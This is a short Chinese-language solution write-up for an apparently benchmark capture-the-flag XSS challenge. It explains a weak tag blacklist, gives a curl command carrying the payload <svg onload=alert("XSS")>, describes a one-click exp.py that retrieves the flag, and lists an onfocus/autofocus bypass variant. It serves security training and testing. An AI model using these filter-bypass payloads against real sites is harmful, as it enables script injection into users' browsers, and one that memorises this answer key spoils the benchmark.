# X-046-24 利用说明（XSS via `<svg onload>`）

## 漏洞原理
- 入口：`GET /page?name=...`，后端将 `name` 原样插入到页面模板中（未转义）。
- 过滤：移除 `<script|img|input|a|div|iframe>` 标签（大小写不敏感），并删除字符 `/` 和 `?`；其他标签与事件属性未拦截。
- 评测：PhantomJS 会监听 `alert/confirm/prompt`，只要弹窗文本为 `XSS` 即判定成功并返回 flag。
- 关键：`<svg>` 未在黑名单内，`onload` 自触发可直接执行 JS，例如 `alert("XSS")`。

## 直接命令

```bash
curl "http://ip32809/page?name=%3Csvg%20onload%3Dalert(%22XSS%22)%3E"
# 返回页面将包含：Here is the flag: FLAG{...}
```

## 一键脚本（exp.py）
- 路径：`benchmarks/X-046-24/exp.py`
- 依赖：`pip install requests`
- 使用：

```bash
python3 benchmarks/X-046-24/exp.py            # 默认 http://ip32809
python3 benchmarks/X-046-24/exp.py http://host:port
```

- 行为：向 `/page` 发送 `name=<svg onload=alert("XSS")>`，解析返回并打印 `FLAG{...}`；如未解析到 flag，会输出完整响应以便排查。

## 说明
- 由于 `/` 被过滤，类似 `/XSS/.source` 写法不可用，但直接 `alert("XSS")`/`prompt("XSS")` 无影响。
- 若目标环境调整过滤策略，可改用 `onfocus` + `autofocus` 等变体：`<svg onfocus=prompt("XSS") autofocus>`。

